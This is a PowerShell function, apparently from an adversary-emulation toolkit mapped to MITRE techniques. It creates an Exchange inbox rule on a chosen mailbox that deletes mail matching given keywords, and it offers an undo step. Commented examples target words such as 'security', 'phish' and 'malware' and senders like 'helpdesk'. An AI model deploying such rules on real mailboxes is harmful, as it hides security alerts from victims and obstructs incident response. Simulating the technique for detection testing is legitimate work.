function MailboxDeleteRuleSetup {	
    mitre_details("MailboxDeleteRuleSetup")

    $inititate_recon = Read-Host -Prompt "`nInitiate recon to retrive available mailbox addresses (Yes/No)"
    
    if ($inititate_recon -notin "No","no","N","n"){
        Get-Mailbox | Format-Table -Property DisplayName,PrimarySmtpAddress 
    }

    else {
        #DoNothing
    }

    #Enter account to compromise
    $InternalUserName = Read-Host -Prompt "Enter a available mailbox address to setup inbox rule on"
    $InboxRuleName = Read-Host -Prompt "Enter a name for the mailbox rule you want to create"
    Write-Host "`nConfiguring mailbox rule to delete emails from $InternalUserName mailbox containing specific terms" -ForegroundColor Gray

    #Take keywords for the mailbox rule
    do {
        $input_rule_keywords = Read-Host -Prompt "Enter a term or multiple terms separated by comma(,) to include in the mailbox rule"

        if ($input_rule_keywords -eq $null) {
            Write-Host "Its not like giving a compliment. I am sure you can come up with a few words ;)" -ForegroundColor Red
        }
    } while (
        $input_rule_keywords -eq $null
    )
    
    $rule_keywords = $input_rule_keywords.Split(",").TrimStart()
    
    #Setup Inbox Rules
    try {
        Write-Host "`nCreating mailbox rule to delete messages with keywords matching: $rule_keywords"
        #New-InboxRule $InboxRuleName -DeleteMessage $true -SubjectOrBodyContainsWords 'security','compromise','infected','report','malware','suspicious','phish','hack' -Mailbox $InternalUserName -ErrorAction Stop
        New-InboxRule $InboxRuleName -DeleteMessage $true -SubjectOrBodyContainsWords $rule_keywords -Mailbox $InternalUserName -Confirm:$false -ErrorAction Stop
        #New-InboxRule $InboxRuleName -DeleteMessage $true -FromAddressContainsWords 'security','it','helpdesk' -Mailbox $InternalUserName
        Start-Sleep -s 5

        #Confirm rule setup
        Get-InboxRule -Mailbox $InternalUserName
        Write-Host "`nNew mailbox rule has been deployed successfully!!!" -ForegroundColor Yellow -BackgroundColor Black
        $allow_undo = $true
    }
    catch {
        Write-Host "`nError: Failed to create the mailbox rule!"
    }

    #Undo changes
    if ($allow_undo -eq $true) {
        $cleanup = Read-Host -Prompt "`nWould you like to remove the mailbox rule created (Yes/No)"

        if ($cleanup -notin "No","no","N","n"){

            try {
                Write-Host "`nRemoving the new mailbox rules created..."
                Remove-InboxRule -Mailbox $InternalUserName -Identity $InboxRuleName -Confirm:$false -ErrorAction Stop
                Write-Host "`nUndo successful: Removed mailbox rule: $InboxRuleName" -ForegroundColor Yellow -BackgroundColor Black
            }
            catch {
                Write-Host "`nError: Failed to delete mailbox rule $InboxRuleName!`n You can try to delete it manually from the Admin console."
            }
        }

        else {
            #DoNothing
        }
    }
    Pause
}